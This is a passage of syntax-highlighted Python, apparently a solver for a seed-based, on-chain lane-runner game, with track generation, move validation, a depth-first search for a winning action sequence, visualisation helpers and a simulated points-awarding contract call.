      <span class="c1"># Must dodge under wires
</span>      <span class="k">if</span> <span class="n">obstacle</span> <span class="o">==</span> <span class="n">LANE_WIRE</span> <span class="ow">and</span> <span class="n">user_action</span> <span class="o">!=</span> <span class="n">ACTION_DODGE</span><span class="p">:</span>
          <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Must dodge under wires"</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">solve_position</span><span class="p">(</span><span class="n">current_lane</span><span class="p">,</span> <span class="n">action</span><span class="p">,</span> <span class="n">lanes</span><span class="p">):</span>
      <span class="s">"""Solve one position update"""</span>
      <span class="n">new_lane</span> <span class="o">=</span> <span class="n">update_current_lane</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span>
      <span class="n">obstacle</span> <span class="o">=</span> <span class="n">_get_front_obstacle</span><span class="p">(</span><span class="n">new_lane</span><span class="p">,</span> <span class="n">lanes</span><span class="p">)</span>
      <span class="n">validate_move</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">obstacle</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">new_lane</span>
    
  <span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">actions</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">):</span>
      <span class="s">"""Solve game state for one step"""</span>
      <span class="n">action</span> <span class="o">=</span> <span class="n">get_action</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">actions</span><span class="p">)</span>
      <span class="n">new_pos</span> <span class="o">=</span> <span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span>
      <span class="n">lanes</span> <span class="o">=</span> <span class="n">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
      <span class="n">new_lane</span> <span class="o">=</span> <span class="n">solve_position</span><span class="p">(</span><span class="n">current_lane</span><span class="p">,</span> <span class="n">action</span><span class="p">,</span> <span class="n">lanes</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">actions</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">,</span> <span class="n">new_pos</span><span class="p">,</span> <span class="n">new_lane</span>
    
  <span class="k">def</span> <span class="nf">get_obstacle_decompressed</span><span class="p">(</span><span class="n">obstacle</span><span class="p">):</span>
      <span class="s">"""Decompress obstacle into individual lanes"""</span>
      <span class="n">lanes</span> <span class="o">=</span> <span class="n">encode_obstacle</span><span class="p">(</span><span class="n">obstacle</span><span class="p">)</span>
      <span class="n">lane1</span> <span class="o">=</span> <span class="n">lanes</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
      <span class="n">lane2</span> <span class="o">=</span> <span class="p">(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
      <span class="n">lane3</span> <span class="o">=</span> <span class="p">(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
      <span class="k">return</span> <span class="n">lane3</span><span class="p">,</span> <span class="n">lane2</span><span class="p">,</span> <span class="n">lane1</span>
    
  <span class="k">def</span> <span class="nf">add_points</span><span class="p">(</span><span class="n">caller_address</span><span class="p">):</span>
      <span class="s">"""Call contract to add points (simulated)"""</span>
      <span class="c1"># This would normally make an external contract call
</span>      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Adding points for </span><span class="si">{</span><span class="n">caller_address</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">return</span> <span class="bp">True</span>
    
  <span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">actions</span><span class="p">):</span>
      <span class="s">"""Main function that processes the entire game"""</span>
      <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span> <span class="o">=</span> <span class="n">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
      <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="n">current_lane</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># Start in the middle lane
</span>        
      <span class="c1"># Loop until we reach position 48
</span>      <span class="k">while</span> <span class="n">pos</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
          <span class="n">actions</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">actions</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span>
        
      <span class="c1"># Add points when complete
</span>      <span class="n">caller_address</span> <span class="o">=</span> <span class="s">"0xYourAddressHere"</span>  <span class="c1"># This would normally be msg.sender
</span>      <span class="n">add_points</span><span class="p">(</span><span class="n">caller_address</span><span class="p">)</span>
        
      <span class="k">return</span> <span class="bp">True</span>
    
  <span class="kn">import</span> <span class="nn">random</span>
  <span class="kn">import</span> <span class="nn">hashlib</span>
    
  <span class="c1"># Add this function to visualize the game
</span>  <span class="k">def</span> <span class="nf">visualize_game</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">actions</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
      <span class="s">"""Generate and visualize a random game track"""</span>
      <span class="k">if</span> <span class="n">actions</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
          <span class="c1"># Generate empty actions (all 0s)
</span>          <span class="n">actions</span> <span class="o">=</span> <span class="mi">0</span>
        
      <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span> <span class="o">=</span> <span class="n">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        
      <span class="c1"># Display header
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"="</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Game with seed: </span><span class="si">{</span><span class="n">seed</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"="</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
        
      <span class="c1"># Symbol mapping
</span>      <span class="n">symbols</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">LANE_EMPTY</span><span class="p">:</span> <span class="s">" "</span><span class="p">,</span>  <span class="c1"># Empty space
</span>          <span class="n">LANE_WALL</span><span class="p">:</span> <span class="s">"█"</span><span class="p">,</span>   <span class="c1"># Wall
</span>          <span class="n">LANE_ROCK</span><span class="p">:</span> <span class="s">"O"</span><span class="p">,</span>   <span class="c1"># Rock
</span>          <span class="n">LANE_WIRE</span><span class="p">:</span> <span class="s">"~"</span>    <span class="c1"># Wire
</span>      <span class="p">}</span>
        
      <span class="c1"># Generate and display each position
</span>      <span class="n">current_lane</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># Start in middle lane
</span>      <span class="n">player_positions</span> <span class="o">=</span> <span class="p">[]</span>
        
      <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>  <span class="c1"># 48 positions total
</span>          <span class="n">lanes</span> <span class="o">=</span> <span class="n">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
            
          <span class="c1"># Extract lane contents
</span>          <span class="n">lane1</span> <span class="o">=</span> <span class="n">lanes</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
          <span class="n">lane2</span> <span class="o">=</span> <span class="p">(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
          <span class="n">lane3</span> <span class="o">=</span> <span class="p">(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
            
          <span class="c1"># Store information about the current position
</span>          <span class="k">if</span> <span class="n">actions</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
              <span class="n">action</span> <span class="o">=</span> <span class="n">get_action</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">actions</span><span class="p">)</span>
              <span class="k">try</span><span class="p">:</span>
                  <span class="c1"># Simulate movement if actions are provided
</span>                  <span class="n">current_lane</span> <span class="o">=</span> <span class="n">update_current_lane</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span>
                  <span class="n">obstacle</span> <span class="o">=</span> <span class="n">_get_front_obstacle</span><span class="p">(</span><span class="n">current_lane</span><span class="p">,</span> <span class="n">lanes</span><span class="p">)</span>
                  <span class="n">validate_move</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">obstacle</span><span class="p">)</span>
                  <span class="n">player_positions</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">))</span>
              <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Game over at position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                  <span class="k">break</span>
            
          <span class="c1"># Print the lanes
</span>          <span class="n">lane_display</span> <span class="o">=</span> <span class="p">[</span>
              <span class="sa">f</span><span class="s">"Lane 1: </span><span class="si">{</span><span class="n">symbols</span><span class="p">[</span><span class="n">lane1</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
              <span class="sa">f</span><span class="s">"Lane 2: </span><span class="si">{</span><span class="n">symbols</span><span class="p">[</span><span class="n">lane2</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
              <span class="sa">f</span><span class="s">"Lane 3: </span><span class="si">{</span><span class="n">symbols</span><span class="p">[</span><span class="n">lane3</span><span class="p">]</span><span class="si">}</span><span class="s">"</span>
          <span class="p">]</span>
            
          <span class="c1"># Add player marker if we're tracking actions
</span>          <span class="k">if</span> <span class="n">actions</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span> <span class="ow">in</span> <span class="n">player_positions</span><span class="p">:</span>
              <span class="n">lane_display</span><span class="p">[</span><span class="n">current_lane</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="s">" &lt;Player&gt;"</span>
                
          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">:"</span><span class="p">)</span>
          <span class="k">for</span> <span class="n">lane</span> <span class="ow">in</span> <span class="n">lane_display</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="n">lane</span><span class="p">)</span>
          <span class="k">print</span><span class="p">()</span>
    
  <span class="k">def</span> <span class="nf">generate_random_seed</span><span class="p">():</span>
      <span class="s">"""Generate a random seed for the game"""</span>
    
      <span class="c1"># return SEED
</span>      <span class="k">return</span> <span class="mi">27684352554021427800379120908796796058859940284427164423451880434819558757544</span>
      <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">256</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">visualize_compact</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">48</span><span class="p">):</span>
      <span class="s">"""Generate a more compact visualization of the game track"""</span>
      <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span> <span class="o">=</span> <span class="n">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        
      <span class="c1"># Symbol mapping
</span>      <span class="n">symbols</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">LANE_EMPTY</span><span class="p">:</span> <span class="s">"·"</span><span class="p">,</span>  <span class="c1"># Empty space
</span>          <span class="n">LANE_WALL</span><span class="p">:</span> <span class="s">"█"</span><span class="p">,</span>   <span class="c1"># Wall
</span>          <span class="n">LANE_ROCK</span><span class="p">:</span> <span class="s">"O"</span><span class="p">,</span>   <span class="c1"># Rock
</span>          <span class="n">LANE_WIRE</span><span class="p">:</span> <span class="s">"~"</span>    <span class="c1"># Wire
</span>      <span class="p">}</span>
        
      <span class="c1"># Display header
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"="</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Game with seed: </span><span class="si">{</span><span class="n">seed</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"="</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
        
      <span class="c1"># Build the track visualization
</span>      <span class="n">track</span> <span class="o">=</span> <span class="p">[[</span><span class="s">""</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">)]</span>
        
      <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
          <span class="n">lanes</span> <span class="o">=</span> <span class="n">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
            
          <span class="c1"># Extract lane contents
</span>          <span class="n">track</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">symbols</span><span class="p">[</span><span class="n">lanes</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>           <span class="c1"># Lane 1
</span>          <span class="n">track</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">symbols</span><span class="p">[(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>    <span class="c1"># Lane 2
</span>          <span class="n">track</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">symbols</span><span class="p">[(</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>    <span class="c1"># Lane 3
</span>        
      <span class="c1"># Print the track
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"Lane 1: "</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">track</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Lane 2: "</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">track</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Lane 3: "</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">track</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
      <span class="k">print</span><span class="p">()</span>
    
  <span class="k">def</span> <span class="nf">is_solvable</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
      <span class="s">"""Determine if the maze can be solved with the given seed"""</span>
      <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span> <span class="o">=</span> <span class="n">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
      <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="n">current_lane</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># Start in middle lane
</span>        
      <span class="k">print</span><span class="p">(</span><span class="s">"Checking if maze is solvable..."</span><span class="p">)</span>
        
      <span class="c1"># Try to navigate through all positions
</span>      <span class="k">while</span> <span class="n">pos</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
          <span class="n">lanes</span> <span class="o">=</span> <span class="n">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
            
          <span class="c1"># Try all possible actions
</span>          <span class="n">solvable_position</span> <span class="o">=</span> <span class="bp">False</span>
          <span class="n">best_action</span> <span class="o">=</span> <span class="bp">None</span>
            
          <span class="k">for</span> <span class="n">action</span> <span class="ow">in</span> <span class="p">[</span><span class="n">ACTION_NONE</span><span class="p">,</span> <span class="n">ACTION_UP</span><span class="p">,</span> <span class="n">ACTION_DOWN</span><span class="p">,</span> <span class="n">ACTION_JUMP</span><span class="p">,</span> <span class="n">ACTION_DODGE</span><span class="p">]:</span>
              <span class="k">try</span><span class="p">:</span>
                  <span class="n">new_lane</span> <span class="o">=</span> <span class="n">update_current_lane</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span>
                  <span class="n">obstacle</span> <span class="o">=</span> <span class="n">_get_front_obstacle</span><span class="p">(</span><span class="n">new_lane</span><span class="p">,</span> <span class="n">lanes</span><span class="p">)</span>
                  <span class="n">validate_move</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">obstacle</span><span class="p">)</span>
                    
                  <span class="c1"># Found a valid move
</span>                  <span class="n">solvable_position</span> <span class="o">=</span> <span class="bp">True</span>
                  <span class="n">best_action</span> <span class="o">=</span> <span class="n">action</span>
                  <span class="n">current_lane</span> <span class="o">=</span> <span class="n">new_lane</span>
                  <span class="k">break</span>
              <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                  <span class="k">continue</span>
            
          <span class="k">if</span> <span class="ow">not</span> <span class="n">solvable_position</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"No valid move found at position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
              <span class="k">return</span> <span class="bp">False</span>
            
          <span class="c1"># Move to next position
</span>          <span class="n">pos</span> <span class="o">+=</span> <span class="mi">1</span>
        
      <span class="k">print</span><span class="p">(</span><span class="s">"Maze is solvable!"</span><span class="p">)</span>
      <span class="k">return</span> <span class="bp">True</span>
    
  <span class="k">def</span> <span class="nf">find_solution_dfs</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
      <span class="s">"""Find a solution for the maze using Depth-First Search"""</span>
      <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span> <span class="o">=</span> <span class="n">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        
      <span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">,</span> <span class="n">actions_so_far</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
          <span class="c1"># If we reached the end, we've found a solution
</span>          <span class="k">if</span> <span class="n">pos</span> <span class="o">&gt;=</span> <span class="mi">48</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">actions_so_far</span>
            
          <span class="c1"># Get the current track layout
</span>          <span class="n">lanes</span> <span class="o">=</span> <span class="n">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
            
          <span class="c1"># Try each possible action in order
</span>          <span class="k">for</span> <span class="n">action</span> <span class="ow">in</span> <span class="p">[</span><span class="n">ACTION_NONE</span><span class="p">,</span> <span class="n">ACTION_UP</span><span class="p">,</span> <span class="n">ACTION_DOWN</span><span class="p">,</span> <span class="n">ACTION_JUMP</span><span class="p">,</span> <span class="n">ACTION_DODGE</span><span class="p">]:</span>
              <span class="k">try</span><span class="p">:</span>
                  <span class="c1"># Check if this action is valid
</span>                  <span class="n">new_lane</span> <span class="o">=</span> <span class="n">update_current_lane</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">)</span>
                  <span class="n">obstacle</span> <span class="o">=</span> <span class="n">_get_front_obstacle</span><span class="p">(</span><span class="n">new_lane</span><span class="p">,</span> <span class="n">lanes</span><span class="p">)</span>
                  <span class="n">validate_move</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">obstacle</span><span class="p">)</span>
                    
                  <span class="c1"># Valid move found, add this action to our solution
</span>                  <span class="n">new_actions</span> <span class="o">=</span> <span class="n">actions_so_far</span> <span class="o">|</span> <span class="p">(</span><span class="n">action</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">pos</span> <span class="o">*</span> <span class="mi">3</span><span class="p">))</span>
                    
                  <span class="c1"># Explore this path further
</span>                  <span class="n">result</span> <span class="o">=</span> <span class="n">dfs</span><span class="p">(</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">new_lane</span><span class="p">,</span> <span class="n">new_actions</span><span class="p">)</span>
                    
                  <span class="c1"># If we found a solution down this path, return it
</span>                  <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                      <span class="k">return</span> <span class="n">result</span>
                    
              <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                  <span class="c1"># Invalid move, try next action
</span>                  <span class="k">continue</span>
            
          <span class="c1"># No solution found from this position
</span>          <span class="k">return</span> <span class="bp">None</span>
        
      <span class="c1"># Start DFS from position 0, middle lane
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"Searching for solution with DFS..."</span><span class="p">)</span>
      <span class="n">solution</span> <span class="o">=</span> <span class="n">dfs</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        
      <span class="k">if</span> <span class="n">solution</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
          <span class="k">print</span><span class="p">(</span><span class="s">"Solution found!"</span><span class="p">)</span>
          <span class="k">return</span> <span class="n">solution</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">print</span><span class="p">(</span><span class="s">"No solution exists."</span><span class="p">)</span>
          <span class="k">return</span> <span class="bp">None</span>
    
  <span class="k">def</span> <span class="nf">solution_to_action_array</span><span class="p">(</span><span class="n">solution</span><span class="p">):</span>
      <span class="s">"""Convert a solution integer to an array of 3-bit action values"""</span>
      <span class="n">actions</span> <span class="o">=</span> <span class="p">[]</span>
        
      <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
          <span class="c1"># Extract the 3-bit action at this position
</span>          <span class="n">action</span> <span class="o">=</span> <span class="n">get_action</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">solution</span><span class="p">)</span>
          <span class="n">actions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">action</span><span class="p">)</span>
        
      <span class="k">return</span> <span class="n">actions</span>
    
  <span class="k">def</span> <span class="nf">print_solution_as_array</span><span class="p">(</span><span class="n">solution</span><span class="p">):</span>
      <span class="s">"""Print the solution as an array of actions with their names"""</span>
      <span class="k">global</span> <span class="n">action_array</span>
      <span class="n">action_array</span> <span class="o">=</span> <span class="n">solution_to_action_array</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span>
        
      <span class="c1"># Action name mapping
</span>      <span class="n">action_names</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">ACTION_NONE</span><span class="p">:</span> <span class="s">"NONE"</span><span class="p">,</span>
          <span class="n">ACTION_UP</span><span class="p">:</span> <span class="s">"UP"</span><span class="p">,</span>
          <span class="n">ACTION_DOWN</span><span class="p">:</span> <span class="s">"DOWN"</span><span class="p">,</span>
          <span class="n">ACTION_JUMP</span><span class="p">:</span> <span class="s">"JUMP"</span><span class="p">,</span>
          <span class="n">ACTION_DODGE</span><span class="p">:</span> <span class="s">"DODGE"</span>
      <span class="p">}</span>
        
      <span class="c1"># Print array format
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"Solution as 3-bit action array:"</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"["</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
        
      <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">action</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">action_array</span><span class="p">):</span>
          <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="s">", "</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
            
          <span class="c1"># Print position, action value, and name
</span>          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
        
      <span class="k">print</span><span class="p">(</span><span class="s">"]"</span><span class="p">)</span>
        
      <span class="c1"># Print with action names for readability
</span>      <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Solution with action names:"</span><span class="p">)</span>
      <span class="k">for</span> <span class="n">pos</span><span class="p">,</span> <span class="n">action</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">action_array</span><span class="p">):</span>
          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="n">action_names</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="s">'UNKNOWN'</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    
  <span class="c1"># Main script to generate and visualize a game
</span>  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
      <span class="c1"># Generate a random seed
</span>      <span class="n">random_seed</span> <span class="o">=</span> <span class="n">generate_random_seed</span><span class="p">()</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Generated random seed: </span><span class="si">{</span><span class="n">random_seed</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        
      <span class="c1"># Visualize the game in compact format
</span>      <span class="n">visualize_compact</span><span class="p">(</span><span class="n">random_seed</span><span class="p">)</span>
        
      <span class="c1"># Try to find a solution using DFS
</span>      <span class="n">solution</span> <span class="o">=</span> <span class="n">find_solution_dfs</span><span class="p">(</span><span class="n">random_seed</span><span class="p">)</span>
        
      <span class="k">if</span> <span class="n">solution</span><span class="p">:</span>
          <span class="n">print_solution_as_array</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span>
            
          <span class="c1"># Convert solution to hex string with 0 padding
</span>          <span class="c1"># Each byte can hold 2 full 3-bit actions (with 2 bits left over)
</span>          <span class="n">hex_bytes</span> <span class="o">=</span> <span class="p">[]</span>
          <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
              <span class="k">if</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
                  <span class="c1"># Two full actions in one byte
</span>                  <span class="n">byte_val</span> <span class="o">=</span> <span class="n">action_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">action_array</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span>
              <span class="k">else</span><span class="p">:</span>
                  <span class="c1"># Last action if odd number
</span>                  <span class="n">byte_val</span> <span class="o">=</span> <span class="n">action_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
              <span class="n">hex_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte_val</span><span class="p">)</span>
          <span class="k">print</span><span class="p">(</span><span class="n">action_array</span><span class="p">)</span>
          <span class="n">bits</span> <span class="o">=</span> <span class="s">""</span>
          <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">action_array</span><span class="p">)):</span>
